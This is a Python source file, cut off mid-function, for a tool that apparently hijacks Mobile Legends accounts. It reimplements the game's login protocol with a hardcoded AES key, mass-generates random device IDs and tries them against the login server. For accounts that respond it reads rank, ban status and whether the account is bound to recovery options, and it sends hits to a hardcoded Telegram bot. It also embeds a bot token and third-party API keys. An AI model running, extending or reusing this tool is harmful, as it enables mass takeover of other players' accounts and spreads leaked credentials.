#!/usr/bin/env python3
# ===================================================================
# PREMIUM DEVID SEKER - ULTRA MLBB TOOLS v10.0
# Created by: @PRIME_MICK
# Features: API/Direct/Both + Error Hits + Deep Check + TG Report
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, string
import zstandard as zstd, struct, re, requests, hashlib, base64
from queue import Queue
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional, Callable
from Crypto.Cipher import AES
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone, timedelta
from collections import Counter

init(autoreset=True)

# ────────────────────────────────────────────────────────────────
# 1. CONFIG
# ────────────────────────────────────────────────────────────────

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(BASE_DIR, "PREMIUM_DEVID_SEKER_OUTPUT")

# Telegram
TELEGRAM_BOT_TOKEN = "8950400071:AAERX1SIDYcH_b9kxUatj1B-x_SBLxYU5KE"
TELEGRAM_CHAT_ID = "8353748526"
ADMIN_USERNAME_DISPLAY = "@PRIME_MICK"

# API (checkton.online)
BAN_URL = "https://checkton.online/backend/device_id"
BAN_API_KEY = "XdzVwcnvQAPhGXFbBhCuKfHRjMTFaDlEvSS7O2C7oMo"
INFO_URL = "https://checkton.online/backend/info"
INFO_API_KEY = "XdzVwcnvQAPhGXFbBhCuKfHRjMTFaDlEvSS7O2C7oMo"
API_TIMEOUT = 15

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
SERVER_HOST = 'login.ml.youngjoygame.com'
SERVER_PORT = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL = 'and_usa'
LANGUAGE = 'en'

# File size fix
AVG_BYTES_PER_LINE = 79

HEX_CHARS = "0123456789abcdef"
BASE36_CHARS = string.ascii_lowercase + string.digits
BASE62_CHARS = string.ascii_letters + string.digits

# Global modes
CHECK_MODE = "DIRECT"   # API | DIRECT | BOTH
OEM_MODE = "D"

# Deep Check config
DEEP_CHECK_RETRIES = 3
DEEP_CHECK_DELAY = 2.0
DEEP_CHECK_THREADS = 5

# ══════════════════════════════════════════════════════════════════
#  OEM POOLS
# ══════════════════════════════════════════════════════════════════

OEM_A = "cd9e459ea708a948d5c2f5a6ca8838cf"

OEM_B_POOL = [
    "e9fbdb6c2be72123da4d703147c94b19", "3587b169e45896db064559df2c2a8e8d",
    "1e526e21ef5d1a27c4cf4f6b8a414189", "2ab86ae5177a1b24550529b69b95067c",
    "d7a1d0aca5b33c9d4c9c2f9ac3f8be61", "369c13b29869edaa27e47898d2b65b47",
    "a084849de06078b102b94d9c9deef8fd", "0870483ad2e1fc6a0e4f6f6cc630e29c",
    "50576dc1844743c995d7dc3f16335723", "422619b9b2cf2285efbfc837c64e9a9e",
    "d8222fa96375675be4537fe928991558", "63b2f0fcc15f91af05ebd30cdd14ec1b",
    "a6160fe063cefb54a52f4119f4040ec0", "02e15c10b575b5aec2e12bc9277b3b2b",
    "5d8d38cf2aa97269d4817e8346fcfb3b", "d520d6f4a4720fd656d4ff430dcf9c10",
    "105da1c5b46e67c2a597f58187dec33e", "4bb140191d54f5137e0ef41766162ea7",
    "14ae3ce77963e5561bd60353edaf4536", "5d259e7c802fc45dc12a1efd305ceafd",
    "0fdb59c757314ea8e31a9c66f54317ab", "1e0d905e8d5f828d97a526163b932696",
    "40e556f652a6a463721e44692293d462", "08025e85f6aa4900cbef1528319e364b",
    "9cfddaf3ac14fc3a30792f3bb69ee400", "a2764e5b72810ea7cc9c8fb4518a64d3",
    "3d31bc455484137719f10f1fa49044b3", "4966eacfb911d57953ebf9d2f59ef143",
    "3c704badf7f59efdf77ab3d27f1dc9c9", "b58373c170e7d1115a2dc142bf626cf7",
    "2c7e65e68fb1f2f72f8004c5806249ac", "cc4d4b384e63e9d171cd20b2cc0cbe98",
    "04962d868101d534001cf1a6532f4f0d", "e2972fbf1eb41440ead1f399cd63c9ee",
    "0282451629b979420486f6019c63f0fc", "4d94a0eeac46962913306922cdfcda9a",
    "78a9985504e01f892c4bdd8654dffb17", "0a8643f8ba4849f6a458cba71b426e6a",
    "8219f2c6c7175e385272952c99da93e7", "49c4461bc742eea93a0db7d4c0e671df",
    "5492850a24c6b9f1b7c137e55a3efff3", "f427e3f2b66e2c732d21107ea0681ddb",
    "8f5905637bf676a17c7d49527dd30a2e", "64835e1cfebd819fb5550e54a0be4325",
    "baf59ad603e9e859a948fdf53d359fb7", "46aa9446b9d36a0e9b1de66b5cc33614",
    "bec525ac69bcd4db008b149112a2c5e3", "78ab5fe0c80c34e2bc455e1949de1672",
    "6f4cab42a5f81ce509ebfb64f09d19c5", "6519dc5c5ece0d5fe4879c5f188621e0",
    "e2633970fb4991fd27c6db415ed97b76", "7b20a21ab9db463ea88c36c1a1ee6bf8",
    "9d076b3d41629c9a98cbe59852ef58e0", "72ff99fa2732feff1121c63068b1ab0e",
    "4fc3edf64adf2b1029e0eebd4d169c87", "8646fe1382e061e831f99aa321014912",
    "a939e4f4ecddfa0a8acbe41144b4139d", "f9a2110483105e68727cabb86b569182",
    "14f1a761abe21a58a3ee65088f250ae5", "58679e587c39d0f9819696812d41075a",
    "1b4a9cb4ec1dfb4e8f60dc6eb0018974", "3d74cf946e711c0cd2d73420a9930b69",
    "4e8c29eb576290944fbe8833acd07b06",
]

OEM_C_POOL = [
    "b7f9a1c2d3e4f5061728394a5b6c7d8e", "a1c8f304e792b516d8e0349acb1527fe",
    "f29c4815a73b06de1928475bc0d1e2f3", "e50b12789f4ca3612d8e057cb4a193fe",
    "d41d8cd98f00b204e9800998ecf8427e",
]

def get_oem(mode: str = None) -> str:
    m = mode or OEM_MODE
    if m == "A": return OEM_A
    elif m == "B": return random.choice(OEM_B_POOL)
    elif m == "C": return random.choice(OEM_C_POOL)
    elif m == "MIX": return OEM_A if random.random() < 0.9 else random.choice(OEM_B_POOL)
    elif m == "MIX_ABC":
        r = random.random()
        if r < 0.70: return OEM_A
        elif r < 0.85: return random.choice(OEM_B_POOL)
        else: return random.choice(OEM_C_POOL)
    return OEM_A

# ══════════════════════════════════════════════════════════════════
#  FOLDERS
# ══════════════════════════════════════════════════════════════════

FOLDERS = {
    "generated": "00_Generated",
    "login": "01_Login_Success",
    "detail": "03_Hasil_Detail_8Req",
    "error_hits": "17_Error_Hits",
    "deep_hits": "18_Deep_Check_Hits",
    "rank_warrior": "04_Rank_Warrior",
    "rank_elite": "05_Rank_Elite",
    "rank_master": "06_Rank_Master",
    "rank_gm": "07_Rank_Grandmaster",
    "rank_epic": "08_Rank_Epic",
    "rank_legend": "09_Rank_Legend",
    "rank_mythic": "10_Rank_Mythic",
    "v2l_active": "11_V2L_Active",
    "v2l_inactive": "12_V2L_Inactive",
    "sultan": "13_Sultan",
    "reports": "16_Reports",
    "checkpoint": "98_Checkpoints",
    "error": "99_Error",
}

def ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    for folder in FOLDERS.values():
        os.makedirs(os.path.join(OUTPUT_DIR, folder), exist_ok=True)
ensure_dirs()

FILES = {
    "generated_devices": os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt"),
    "all_hits_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt"),
    "raw_devices_detail": os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt"),
    "error_hits": os.path.join(OUTPUT_DIR, FOLDERS["error_hits"], "error_hits.txt"),
    "deep_check_hits": os.path.join(OUTPUT_DIR, FOLDERS["deep_hits"], "deep_check_hits.txt"),
    "deep_check_report": os.path.join(OUTPUT_DIR, FOLDERS["deep_hits"], "deep_check_report.txt"),
    "hits_report": os.path.join(OUTPUT_DIR, FOLDERS["reports"], "hits_report.txt"),
}

# ────────────────────────────────────────────────────────────────
# 2. BANNER
# ────────────────────────────────────────────────────────────────

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    banner = f"""
{Fore.MAGENTA}██████╗ ██████╗ ███████╗███╗   ███╗██╗██╗   ██╗███╗   ███╗
{Fore.MAGENTA}██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██║   ██║████╗ ████║
{Fore.CYAN}██████╔╝██████╔╝█████╗  ██╔████╔██║██║██║   ██║██╔████╔██║
{Fore.CYAN}██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██║██║   ██║██║╚██╔╝██║
{Fore.GREEN}██║     ██║  ██║███████╗██║ ╚═╝ ██║██║╚██████╔╝██║ ╚═╝ ██║
{Fore.GREEN}╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.YELLOW}           P R E M I U M   D E V I D   S E K E R
{Fore.YELLOW}═══════════════════════════════════════════════════════════════
{Fore.LIGHTBLACK_EX}              Created by: {Fore.CYAN}{ADMIN_USERNAME_DISPLAY}{Fore.LIGHTBLACK_EX} | v10.0
{Fore.LIGHTBLACK_EX}              OEM Mode: {Fore.GREEN}{OEM_MODE}{Fore.LIGHTBLACK_EX}
{Fore.LIGHTBLACK_EX}              Check Mode: {Fore.GREEN}{CHECK_MODE}{Fore.LIGHTBLACK_EX}
{Fore.LIGHTBLACK_EX}═══════════════════════════════════════════════════════════════
{Style.RESET_ALL}
"""
    print(banner)

def print_header(title=""):
    print_banner()
    if title:
        print(f"{Fore.CYAN}┌{'─'*58}┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.WHITE}{title.center(58)}{Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└{'─'*58}┘{Style.RESET_ALL}\n")

# ────────────────────────────────────────────────────────────────
# 3. TELEGRAM
# ────────────────────────────────────────────────────────────────

def send_telegram(message: str) -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def send_telegram_document(file_path: str, caption: str = "") -> bool:
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'}
            resp = requests.post(url, data=data, files=files, timeout=60)
        return resp.status_code == 200
    except Exception as e:
        print(f"{Fore.RED}TG doc error: {e}{Style.RESET_ALL}")
        return False

_telegram_sent_cache = set()
_telegram_sent_lock = threading.Lock()

def send_telegram_once(device_id: str, message: str) -> bool:
    with _telegram_sent_lock:
        if device_id in _telegram_sent_cache:
            return False
        _telegram_sent_cache.add(device_id)
    success = send_telegram(message)
    with _telegram_sent_lock:
        if len(_telegram_sent_cache) > 10000:
            _telegram_sent_cache.clear()
    return success

# ────────────────────────────────────────────────────────────────
# 4. GLOBAL STATE
# ────────────────────────────────────────────────────────────────

HIT_COUNTERS = {
    'sultan': 0, 'v2l_active': 0, 'v2l_inactive': 0, 'banned': 0,
    'warrior': 0, 'elite': 0, 'master': 0, 'gm': 0, 'epic': 0, 'legend': 0, 'mythic': 0
}
COUNTER_LOCK = threading.Lock()
SAVE_LOCK = threading.Lock()

HIT_LIST: List[Dict] = []
ERROR_HIT_LIST: List[Dict] = []
HIT_LIST_LOCK = threading.Lock()

LIVE_STATS = {
    'checked': 0, 'hits': 0, 'banned': 0, 'invalid': 0, 'error_hits': 0,
    'start_time': 0, 'lock': threading.Lock()
}

# ────────────────────────────────────────────────────────────────
# 5. SDP PROTOCOL
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack()
        elif data is not None:
            self.update(data)
            self._pack()

    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()):
            self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[k] = v

    def _write_varint(self, n: int) -> bytes:
        res = bytearray()
        while n >= 0x80:
            res.append((n & 0x7F) | 0x80)
            n >>= 7
        res.append(n & 0x7F)
        return bytes(res)

    def _read_varint(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, dtype: SdpDataType):
        if tag < 15:
            self.data += bytes([(dtype.value << 4) | tag])
        else:
            self.data += bytes([(dtype.value << 4) | 15]) + self._write_varint(tag)

    def _pack_item(self, tag: int, val: Any):
        if isinstance(val, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_varint(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_varint(-val)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_varint(val)
        elif isinstance(val, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            self.data += self._write_varint(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            enc = val.encode('utf-8') if isinstance(val, str) else val
            self.data += self._write_varint(len(enc)) + enc
        elif isinstance(val, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_varint(len(val))
            for item in val: self._pack_item(0, item)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(val.items()): self._pack_item(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_varint(len(val))
                for k, v in sorted(val.items()):
                    self._pack_item(0, k)
                    self._pack_item(0, v)
        else:
            raise Exception("Unsupported type")

    def _unpack_item(self) -> Tuple[int, Any]:
        if self.offset >= len(self.data): return 0, None
        hdr = self.data[self.offset]
        tag = hdr & 0xF
        dtype = SdpDataType(hdr >> 4)
        self.offset += 1
        if tag == 15: tag = self._read_varint()
        if dtype == SdpDataType.INTEGER_POSITIVE: return tag, self._read_varint()
        if dtype == SdpDataType.INTEGER_NEGATIVE: return tag, -self._read_varint()
        if dtype == SdpDataType.FLOAT: return tag, struct.unpack("<f", self._read_varint().to_bytes(4, 'little'))[0]
        if dtype == SdpDataType.DOUBLE: return tag, struct.unpack("<d", self._read_varint().to_bytes(8, 'little'))[0]
        if dtype == SdpDataType.STRING:
            l = self._read_varint()
            raw = self.data[self.offset:self.offset + l]
            self.offset += l
            try: return tag, raw.decode('utf-8')
            except: return tag, raw
        if dtype == SdpDataType.LIST:
            l = self._read_varint()
            res = [self._unpack_item()[1] for _ in range(l)]
            return tag, res
        if dtype == SdpDataType.DICT:
            l = self._read_varint()
            res = {}
            for _ in range(l):
                _, k = self._unpack_item()
                _, v = self._unpack_item()
                res[k] = v
            return tag, res
        if dtype == SdpDataType.STRUCT_BEGIN:
            res = {}
            while True:
                k, v = self._unpack_item()
                if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
                res[k] = v
            return tag, SdpStruct(res)
        if dtype == SdpDataType.STRUCT_END: return tag, SdpDataType.STRUCT_END
        raise Exception("Unknown data type")

# ────────────────────────────────────────────────────────────────
# 6. CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue = b''

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(10)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1
            self.socket = None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, *args):
        self.cleanup()

    def send_data(self, pid: int, sdp: SdpStruct):
        pkt = SdpStruct({0: pid, 1: self.sequence, 5: sdp.data}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        self.socket.send(flags.to_bytes(4, 'big') + comp)
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            flags = int.from_bytes(self.queue[:4], 'big')
            size = flags & 0xFFFFFF
            ctype = flags >> 24
            while len(self.queue) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                self.queue += d
            data = self.queue[4:size]
            self.queue = self.queue[size:]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data)
            pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return (pid, SdpStruct(body)) if body and isinstance(body, bytes) else (pid, None)
        except socket.timeout: return -1, None
        except: return None, None

class GameLogin(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""

    def run(self) -> Tuple[Optional[int], Optional[int], str]:
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: LANGUAGE
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None), "NORMAL"
            return None, None, f"FAIL (PID: {pid})"
        except Exception as e:
            return None, None, f"ERROR ({e})"
        finally:
            self.cleanup()

class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")):
            raw = raw[4:]
        self.imei = raw[:32] if len(raw) >= 32 else raw
        self.android = raw[32:48] if len(raw) >= 48 else ""
        self.adid = raw[48:] if len(raw) > 48 else ""
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_host = ''
        self.game_port = 0
        self.creation_ts = 0
        self.ban_status = "NORMAL"

    def login_to_login_server(self) -> bool:
        if not self.socket or self.host != SERVER_HOST:
            self.cleanup()
            self.host, self.port = SERVER_HOST, SERVER_PORT
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.adid}&android_id={self.android}&device_unique_id={self.imei}',
            2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            self.creation_ts = res.get(19, 0)
            self.ban_status = "NORMAL"
            return True
        self.ban_status = f"LOGIN FAILED (PID: {pid})"
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: CLIENT_VERSION, 5: self.zone_id, 6: CHANNEL
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            host, port = res[1].split(':')
            self.game_host = host
            self.game_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host, self.port = self.game_host, self.game_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id, 4: CLIENT_VERSION, 13: CHANNEL, 15: self.device_id
        }))
        for _ in range(5):
            pid, res = self.recv_data()
            if pid == 10002: return True
            if pid in (-1, None): break
        return False

    def check_ban_status(self) -> str:
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.recv_data()
            if pid == 20001 and res and isinstance(res, dict) and 0 in res and isinstance(res[0], dict):
                binfo = res[0]
                reason = binfo.get('ban_reason', 'Unknown')
                self.ban_status = f"BANNED ({reason})"
                return self.ban_status
            if pid in (-1, None, 20002): break
        return self.ban_status

    def lookup_player(self, search_value: int):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        for _ in range(8):
            pid, res = self.recv_data()
            if pid in (-1, None): return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None
        return None

    def get_role_info(self, role_id: int, zone_id: int):
        self.send_data(10128, SdpStruct({1: int(role_id), 2: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10129: return res
        return None

    def get_skin_role_info(self, role_id: int, zone_id: int):
        self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(4):
            pid, res = self.recv_data()
            if pid in (-1, None): break
            if pid == 10144: return res
        return None

# ────────────────────────────────────────────────────────────────
# 7. V2L + MOONTON + OFFLINE + RANK
# ────────────────────────────────────────────────────────────────

def get_v2l_status(conn, role_id: int, zone_id: int) -> str:
    try:
        conn.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
        for _ in range(3):
            pid, res = conn.recv_data()
            if pid in (-1, None): break
            if pid == 10208 and res:
                data = dict(res)
                for tag in [10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21]:
                    val = data.get(tag)
                    if val is not None and isinstance(val, (int, float)):
                        return "Enabled" if int(val) > 0 else "Disabled"
    except Exception:
        pass
    return "N/A"

def get_moonton_status(conn, role_id: int, zone_id: int) -> Dict[str, str]:
    result = {'mt': 'clear', 'mt_mail': 'clear', 'third_party': 'clear'}
    for pid_send, pid_recv in [(10214, 10215), (10178, 10179)]:
        try:
            conn.send_data(pid_send, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            for _ in range(3):
                pid, res = conn.recv_data()
                if pid in (-1, None): break
                if pid == pid_recv and res:
                    d = dict(res)
                    mt_val = d.get(1) or d.get(10) or d.get(20)
                    mt_mail_val = d.get(2) or d.get(11) or d.get(21)
                    third_val = d.get(3) or d.get(4) or d.get(5) or d.get(12)
                    result['mt'] = 'bound' if mt_val else 'clear'
                    result['mt_mail'] = 'bound' if mt_mail_val else 'clear'
                    result['third_party'] = 'bound' if third_val else 'clear'
                    return result
        except Exception:
            pass
    return result

def compute_offline_info(last_online_ts) -> Dict[str, Any]:
    now_utc = datetime.now(timezone.utc)
    if not last_online_ts or not isinstance(last_online_ts, (int, float)) or last_online_ts <= 0:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}
    try:
        last_dt = datetime.fromtimestamp(int(last_online_ts), tz=timezone.utc)
        delta = now_utc - last_dt
        days = int(delta.total_seconds() // 86400)
        hours = int((delta.total_seconds() % 86400) // 3600)
        last_wib = last_dt.astimezone(TZ_WIB).strftime('%Y-%m-%d %H:%M:%S WIB')
        if days > 0: offline = f"{days} days"
        elif hours > 0: offline = f"{hours} hours"
        else: offline = f"{int((delta.total_seconds() % 3600) // 60)} minutes"
        return {'offline_days': offline, 'last_online': last_wib, 'raw_days': days}
    except Exception:
        return {'offline_days': 'N/A', 'last_online': 'N/A', 'raw_days': 0}

def map_rank(p) -> str:
    if not p or not isinstance(p, (int, float)) or p <= 0:
        return "Unranked"
    p = int(p)
    if p >= 136:
        stars = p - 136
        if stars >= 100: return f"Mythical Immortal ({stars}★)"
        if stars >= 50: return f"Mythical Glory ({stars}★)"
        if stars >= 25: return f"Mythical Honor ({stars}★)"
        return f"Mythic ({stars}★)"
    ranks = [
        (105, "Legend", 5, ["V","IV","III","II","I"]),
        (75, "Epic", 5, ["V","IV","III","II","I"]),
        (45, "Grandmaster", 5, ["V","IV","III","II","I"]),
        (25, "Master", 4, ["IV","III","II","I"]),
        (10, "Elite", 3, ["IV","III","II","I"]),
        (1, "Warrior", 3, ["III","II","I"]),
    ]
    for threshold, name, div_stars, div_names in ranks:
        if p >= threshold:
            offset = p - threshold
            div_idx = min(len(div_names)-1, offset // div_stars)
            star = (offset % div_stars) + 1
            return f"{name} {div_names[div_idx]} ({star}★)"
    return "Warrior III (1★)"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt or "immortal" in rt or "glory" in rt or "honor" in rt:
        return "mythic"
    return "other"

def get_stars_from_rank(rank_text: str) -> int:
    match = re.search(r'\((\d+)★\)', rank_text)
    return int(match.group(1)) if match else 0

# ────────────────────────────────────────────────────────────────
# 8. DEVICE GENERATOR (8 formats)
# ────────────────────────────────────────────────────────────────

def random_hex(n): return ''.join(random.choices(HEX_CHARS, k=n))
def random_base36(n): return ''.join(random.choices(BASE36_CHARS, k=n))
def random_base62(n): return ''.join(random.choices(BASE62_CHARS, k=n))
def uuid4_str(): return str(uuid.uuid4())
def uuid4_upper(): return str(uuid.uuid4()).upper()

def random_gaid():
    return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def random_android_id(): return random_hex(16)

def random_imei():
    def luhn(digits):
        total = 0
        for i, d in enumerate(reversed(digits)):
            n = int(d)
            if i % 2 == 0:
                n *= 2
                if n > 9: n -= 9
            total += n
        return str((10 - (total % 10)) % 10)
    base = ''.join(random.choices('0123456789', k=14))
    return base + luhn(base)

def format_1_classic():
    return f"and_{get_oem()}{random_hex(16)}-{uuid4_str()}"

def format_2_extended_b36():
    return f"and_{get_oem()}{random_base36(random.choice([20,21,22,23,24,25]))}-{uuid4_str()}"

def format_3_android_style():
    return f"and_{random_android_id()}_{random_base36(20)}"

def format_4_gaid():
    return f"and_{random_gaid()}_{random_hex(16)}"

def format_5_ios_simple():
    return f"ios_{uuid4_upper()}"

def format_6_ios_timestamp():
    return f"ios_{uuid4_upper()}_{int(time.time() * 1_000_000)}"

def format_7_composite():
    return f"and_{get_oem()}{random_imei()}_{random_android_id()}_{random_base36(24)}"

def format_8_uuid5_style():
    ns = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
    name = f"{random_hex(16)}-{random.randint(1000000, 9999999)}"
    return f"and_{str(uuid.uuid5(ns, name)).replace('-','')}_{random_base36(16)}"

FORMAT_REGISTRY = {
    "F1_CLASSIC":      {"func": format_1_classic,      "weight": 25},
    "F2_EXTENDED_B36": {"func": format_2_extended_b36, "weight": 20},
    "F3_ANDROID":      {"func": format_3_android_style,"weight": 15},
    "F4_GAID":         {"func": format_4_gaid,         "weight": 12},
    "F5_IOS":          {"func": format_5_ios_simple,   "weight": 8},
    "F6_IOS_TS":       {"func": format_6_ios_timestamp,"weight": 5},
    "F7_COMPOSITE":    {"func": format_7_composite,    "weight": 10},
    "F8_UUID5":        {"func": format_8_uuid5_style,  "weight": 5},
}

WEIGHTED_FORMAT_POOL = []
for k, info in FORMAT_REGISTRY.items():
    WEIGHTED_FORMAT_POOL.extend([info["func"]] * info["weight"])

FORMAT_STATS = Counter()
FORMAT_STATS_LOCK = threading.Lock()

def generate_oem_d():
    func = random.choice(WEIGHTED_FORMAT_POOL)
    dev = func()
    with FORMAT_STATS_LOCK:
        for name, info in FORMAT_REGISTRY.items():
            if info["func"] == func:
                FORMAT_STATS[name] += 1
                break
    return dev

def generate_verified_device():
    if OEM_MODE == "D":
        return generate_oem_d()
    elif OEM_MODE == "MIX_ABCD":
        r = random.random()
        if r < 0.30:
            return generate_oem_d()
        elif r < 0.60:
            return f"and_{OEM_A}{random_hex(16)}-{uuid4_str()}"
        elif r < 0.80:
            return f"and_{random.choice(OEM_B_POOL)}{random_hex(16)}-{uuid4_str()}"
        else:
            return f"and_{random.choice(OEM_C_POOL)}{random_hex(16)}-{uuid4_str()}"
    else:
        return f"and_{get_oem()}{random_hex(16)}-{uuid4_str()}"

def generate_worker_verified(count, queue):
    for _ in range(count):
        queue.put(generate_verified_device() + "\n")

def writer_thread(queue, output_file):
    buffer = []
    buffer_size = 0
    with open(output_file, "a", encoding="utf-8", buffering=8*1024*1024) as f:
        while True:
            item = queue.get()
            if item is None: break
            buffer.append(item)
            buffer_size += len(item)
            if buffer_size >= 8*1024*1024:
                f.write(''.join(buffer))
                buffer.clear()
                buffer_size = 0
        if buffer:
            f.write(''.join(buffer))

def run_generator(size_mb, threads=16):
    target_lines = int((size_mb * 1024 * 1024) / AVG_BYTES_PER_LINE)
    output_file = FILES["generated_devices"]
